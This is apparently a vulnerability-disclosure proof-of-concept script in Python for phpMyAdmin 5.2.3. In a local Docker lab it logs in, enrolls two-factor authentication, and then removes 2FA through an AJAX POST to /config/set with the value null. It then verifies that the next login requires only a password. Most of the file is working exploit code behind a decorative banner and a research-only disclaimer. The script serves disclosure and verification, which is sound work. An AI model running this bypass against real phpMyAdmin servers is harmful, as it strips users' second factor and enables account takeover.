#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Website : https://abraxaslabs.tech
#  GitHub  : https://github.com/abraxas
#  Twitter : @abraxas_null
#  Mail    : abraxas.null@proton.me
#
#  CVE: phpmyadmin-config-set-2fa (High: 8.1)
#  Vendor: phpMyAdmin (phpMyAdmin)
#  Versions: phpMyAdmin 5.2.3 (RELEASE_5_2_3 / 962857e)
#  Impact: POST /config/set persists 2fa=null without TwoFactor::check
#  Requires: Docker, php:8.2-apache, mysql:8.0, pin RELEASE_5_2_3, loopback 127.0.0.1:19280
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "phpmyadmin-config-set-2fa"
_SITE = "https://abraxaslabs.tech"
_GH = "https://github.com/abraxas"
_XURL = "https://x.com/abraxas_null"
_XH = "@abraxas_null"
_EMAIL = "abraxas.null@proton.me"
_RST = "\033[0m"
_BLD = "\033[1m"


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m" if _on() else ""


_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line, y, n):
    width = max(len(line), 1)
    out = []
    q = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        if ch == '"':
            q = not q
            out.append(_rgb(*(255, 201, 70) if q else (255, 230, 0)) + ch)
            continue
        if q:
            out.append(_rgb(255, 230, 0) + ch)
            continue
        r, g, b = _rain(x, width)
        out.append(_rgb(r, g, b) + ch)
    return "".join(out) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(x) for x in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    cyan, mag = _rgb(0, 255, 249), _rgb(255, 0, 212)
    top = cyan + "╔" + "═" * (box_w - 2) + "╗" + _RST
    mid = mag + "╠" + "═" * (box_w - 2) + "╣" + _RST
    bot = cyan + "╚" + "═" * (box_w - 2) + "╝" + _RST

    def row(vis, rendered, border):
        return _rgb(*border) + "║" + _RST + " " + rendered + _RST + " " + _rgb(*border) + "║" + _RST

    lines = [top]
    title_l, title_r = " ABRAXAS LABS", "analyze · reverse · disclose"
    gap = max(content_w - len(title_l) - len(title_r), 1)
    title = (title_l + " " * gap + title_r)[:content_w].ljust(content_w)
    cells = []
    split, rstart = len(title_l), content_w - len(title_r)
    for i, ch in enumerate(title):
        if ch == " ":
            cells.append(ch)
        elif i < split:
            cells.append(_rgb(0, 255, 249) + _BLD + ch)
        elif i >= rstart:
            cells.append(_rgb(140, 155, 175) + ch)
        else:
            cells.append(ch)
    lines.append(row(title, "".join(cells) + _RST, (0, 255, 249)))
    lines.append(mid)
    cve_l = " " + _CVE
    cve_r = "authorized research only"
    rest = max(content_w - len(cve_l) - len(cve_r), 3)
    midtxt = " local lab ".center(rest)[:rest]
    cve_line = (cve_l + midtxt + cve_r)[:content_w].ljust(content_w)
    cells = []
    le, rs = len(cve_l), content_w - len(cve_r)
    for i, ch in enumerate(cve_line):
        if ch == " ":
            cells.append(ch)
        elif i < le:
            cells.append(_rgb(255, 77, 224) + _BLD + ch)
        elif i >= rs:
            cells.append(_rgb(57, 255, 20) + ch)
        else:
            cells.append(_rgb(255, 0, 212) + ch)
    lines.append(row(cve_line, "".join(cells) + _RST, (255, 0, 212)))
    lines.append(mid)
    n = len(_ART["abraxas"])
    for y, line in enumerate(_ART["abraxas"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    for y, line in enumerate(_ART["labs"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    lines.append(mid)
    for left, right in (("Website", _SITE), ("GitHub", _GH), ("X", _XH + "  " + _XURL), ("Mail", _EMAIL)):
        gap = max(content_w - 1 - len(left) - len(right), 1)
        vis = (" " + left + " " * gap + right)[:content_w].ljust(content_w)
        out = []
        left_end = 1 + len(left)
        right_start = content_w - len(right)
        for i, ch in enumerate(vis):
            if ch == " ":
                out.append(ch)
            elif i < left_end:
                out.append(_rgb(255, 230, 0) + ch)
            elif i >= right_start:
                out.append(_rgb(0, 255, 249) + ch)
            else:
                out.append(ch)
        lines.append(row(vis, "".join(out) + _RST, (255, 0, 212)))
    lines.append(bot)
    status = "[*]  abraxas!null ready on #labs   ·   " + _SITE
    scol = []
    for ch in status:
        if ch == " ":
            scol.append(ch)
        elif ch in "[]*":
            scol.append(_rgb(57, 255, 20) + ch)
        elif ch in "·#":
            scol.append(_rgb(255, 77, 224) + ch)
        else:
            scol.append(_rgb(232, 255, 248) + ch)
    lines.append(" " + "".join(scol) + _RST)
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    low = s.lower()
    if s.startswith("SUCCESS") or "success" == low[:7]:
        col = _rgb(57, 255, 20) + _BLD
    elif s.startswith("FAIL") or low.startswith("fail"):
        col = _rgb(255, 64, 96) + _BLD
    elif "user_id" in low:
        col = _rgb(255, 201, 70) + _BLD
    elif low.startswith("status=") or "status=" in low[:20]:
        col = _rgb(0, 255, 249)
    elif low.startswith("carrier"):
        col = _rgb(255, 0, 212)
    elif s.lstrip().startswith("{") or s.lstrip().startswith("["):
        col = _rgb(255, 230, 0)
    else:
        col = _rgb(232, 255, 248)
    kwargs = dict(kwargs)
    file = kwargs.get("file", _sys.stdout)
    if file is _sys.stdout or file is _sys.stderr:
        _builtins.print(col + s + _RST, **{k: v for k, v in kwargs.items() if k != "sep"})
    else:
        _builtins.print(*args, **kwargs)


print_abraxas_banner()
_builtins.print = _cprint

"""Prove phpMyAdmin 5.2.3 POST /config/set clears 2FA without step-up."""

import html as htmlmod
import json
import os
import re
import subprocess
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass
from http.cookiejar import CookieJar
from pathlib import Path

LABEL = "phpmyadmin-config-set-2fa"
WITNESS = "PMA-CONFIG-SET-2FA-WITNESS"
COMPOSE_PROJECT = os.environ.get("COMPOSE_PROJECT_NAME", LABEL)
HERE = Path(__file__).resolve().parent
DEFAULT_BASE = os.environ.get("PMA_URL", "http://127.0.0.1:19280").rstrip("/")
USER = "appuser"
PASSWORD = "apppass"
HTTP_TIMEOUT_S = 30


@dataclass(frozen=True)
class HttpResult:
    status: int
    body: str


class Client:
    def __init__(self, base: str) -> None:
        self.base = base.rstrip("/")
        self.jar = CookieJar()
        self.opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(self.jar))

    def request(
        self,
        path: str,
        data: dict[str, str] | None = None,
        ajax: bool = False,
    ) -> HttpResult:
        url = self.base + path
        headers = {"User-Agent": "phpmyadmin-config-set-2fa-lab"}
        body: bytes | None = None
        method = "GET"
        if data is not None:
            method = "POST"
            payload = dict(data)
            if ajax:
                payload.setdefault("ajax_request", "true")
                headers["X-Requested-With"] = "XMLHttpRequest"
            body = urllib.parse.urlencode(payload).encode()
            headers["Content-Type"] = "application/x-www-form-urlencoded"
        req = urllib.request.Request(url, data=body, headers=headers, method=method)
        try:
            with self.opener.open(req, timeout=HTTP_TIMEOUT_S) as resp:
                return HttpResult(int(resp.status), resp.read().decode("utf-8", "replace"))
        except urllib.error.HTTPError as exc:
            return HttpResult(int(exc.code), exc.read().decode("utf-8", "replace"))


def log(msg: str) -> None:
    print(msg, flush=True)


def fail(reason: str) -> int:
    log(f"FAIL {LABEL} {reason} {WITNESS}")
    return 1


def success(detail: str) -> int:
    log(f"SUCCESS {LABEL} {detail} {WITNESS}")
    return 0


def snippet(text: str, limit: int = 180) -> str:
    return " ".join(text.split())[:limit]


def extract_named(html: str, name: str) -> str | None:
    pattern = (
        rf'name="{re.escape(name)}"[^>]*value="([^"]*)"'
        rf'|value="([^"]*)"[^>]*name="{re.escape(name)}"'
    )
    match = re.search(pattern, html, re.I)
    if not match:
        return None
    return htmlmod.unescape(match.group(1) or match.group(2) or "")


def token_from(html: str) -> str | None:
    token = extract_named(html, "token")
    if token:
        return token
    match = re.search(r'"token"\s*:\s*"([^"]+)"', html)
    if match:
        return htmlmod.unescape(match.group(1))
    try:
        payload = json.loads(html)
    except json.JSONDecodeError:
        return None
    if isinstance(payload, dict):
        new_token = payload.get("new_token") or payload.get("token")
        if isinstance(new_token, str) and new_token:
            return new_token
    return None


def is_login_page(html: str) -> bool:
    lowered = html.lower()
    return 'name="pma_username"' in lowered or "pma_username" in lowered


def is_2fa_page(html: str) -> bool:
    lowered = html.lower()
    return (
        'name="2fa_confirm"' in lowered
        or "webauthn_request_response" in lowered
        or "two factor authentication" in lowered
        or "two-factor authentication" in lowered
    )


def is_logged_in(html: str) -> bool:
    if is_login_page(html) or is_2fa_page(html):
        return False
    return (
        "server-breadcrumb" in html
        or 'id="page_content"' in html
        or "route=/server/databases" in html
        or "sql.php" in html
        or 'id="navpanellinks"' in html
    )


def pmadb_config() -> str:
    proc = subprocess.run(
        [
            "docker",
            "compose",
            "-p",
            COMPOSE_PROJECT,
            "exec",
            "-T",
            "db",
            "mysql",
            "-N",
            "-uroot",
            "-prootpass",
            "phpmyadmin",
            "-e",
            "SELECT IFNULL(config_data,'') FROM pma__userconfig WHERE username='appuser'",
        ],
        cwd=HERE,
        text=True,
        capture_output=True,
        timeout=30,
        check=False,
    )
    if proc.returncode != 0:
        log(f"IOC pmadb-query-err {snippet(proc.stderr or proc.stdout)}")
        return ""
    return proc.stdout.strip()


def has_2fa(config_data: str) -> bool:
    if not config_data:
        return False
    try:
        payload = json.loads(config_data)
    except json.JSONDecodeError:
        return '"2fa"' in config_data and "backend" in config_data
    if not isinstance(payload, dict):
        return False
    twofa = payload.get("2fa")
    if not isinstance(twofa, dict):
        return False
    backend = twofa.get("backend")
    return isinstance(backend, str) and backend != ""


def login(client: Client) -> HttpResult:
    page = client.request("/index.php?route=/")
    token = token_from(page.body)
    if not token:
        raise RuntimeError("no CSRF token on login page")
    fields = {
        "pma_username": USER,
        "pma_password": PASSWORD,
        "server": "1",
        "token": token,
        "set_session": extract_named(page.body, "set_session") or "",
    }
    return client.request("/index.php?route=/", fields)


def main() -> int:
    base = DEFAULT_BASE
    log(f"IOC target={base} user={USER} witness={WITNESS}")

    session_a = Client(base)
    try:
        after_login = login(session_a)
    except RuntimeError as exc:
        return fail(str(exc))
    log(
        "IOC password-login status="
        f"{after_login.status} logged_in={is_logged_in(after_login.body)} "
        f"twofa={is_2fa_page(after_login.body)}"
    )
    if is_2fa_page(after_login.body):
        return fail("expected password-only login before enroll")
    if not is_logged_in(after_login.body):
        return fail(f"login-miss body={snippet(after_login.body)}")

    home = session_a.request("/index.php?route=/")
    token = token_from(home.body) or token_from(after_login.body)
    if not token:
        return fail("no token after login")

    enroll = session_a.request(
        "/index.php?route=/preferences/two-factor",
        {"server": "1", "token": token, "2fa_configure": "simple"},
    )
    cfg_enrolled = pmadb_config()
    log(
        "IOC enroll status="
        f"{enroll.status} configured={'configured' in enroll.body.lower()} "
        f"pmadb_2fa={has_2fa(cfg_enrolled)} pmadb={snippet(cfg_enrolled)}"
    )
    if not has_2fa(cfg_enrolled):
        return fail("enroll-did-not-persist-2fa")

    session_b = Client(base)
    try:
        twofa_prompt = login(session_b)
    except RuntimeError as exc:
        return fail(f"session-b {exc}")
    log(
        "IOC second-login status="
        f"{twofa_prompt.status} twofa={is_2fa_page(twofa_prompt.body)} "
        f"confirm={'2fa_confirm' in twofa_prompt.body}"
    )
    if not is_2fa_page(twofa_prompt.body):
        return fail("expected-2fa-prompt-after-enroll")
    if is_logged_in(twofa_prompt.body):
        return fail("second-login-skipped-2fa")

    prefs = session_a.request("/index.php?route=/preferences/two-factor")
    token = token_from(prefs.body) or token
    negative = session_a.request(
        "/index.php?route=/preferences/two-factor",
        {"server": "1", "token": token, "2fa_remove": "1"},
    )
    cfg_after_ui = pmadb_config()
    confirm_ui = "confirm disabling" in negative.body.lower() or "2fa_remove" in negative.body
    log(
        "IOC two-factor-ui-remove status="
        f"{negative.status} confirm={confirm_ui} still_2fa={has_2fa(cfg_after_ui)}"
    )
    if not has_2fa(cfg_after_ui):
        return fail("settings-ui-cleared-2fa-without-factor")

    token = token_from(negative.body) or token_from(prefs.body) or token
    clear = session_a.request(
        "/index.php?route=/config/set",
        {"server": "1", "token": token, "key": "2fa", "value": "null"},
        ajax=True,
    )
    cfg_cleared = pmadb_config()
    log(
        "IOC config-set status="
        f"{clear.status} still_2fa={has_2fa(cfg_cleared)} "
        f"pmadb={snippet(cfg_cleared)} body={snippet(clear.body)}"
    )
    if has_2fa(cfg_cleared):
        return fail("config-set-did-not-clear-2fa")

    session_c = Client(base)
    try:
        after_clear = login(session_c)
    except RuntimeError as exc:
        return fail(f"session-c {exc}")
    log(
        "IOC post-clear-login status="
        f"{after_clear.status} twofa={is_2fa_page(after_clear.body)} "
        f"logged_in={is_logged_in(after_clear.body)}"
    )
    if is_2fa_page(after_clear.body):
        return fail("2fa-prompt-remained-after-config-set")
    if not is_logged_in(after_clear.body):
        return fail(f"post-clear-login-miss body={snippet(after_clear.body)}")

    return success(
        "enroll=simple ui-remove-blocked=yes config-set-cleared=yes "
        "next-login-password-only=yes"
    )


if __name__ == "__main__":
    raise SystemExit(main())

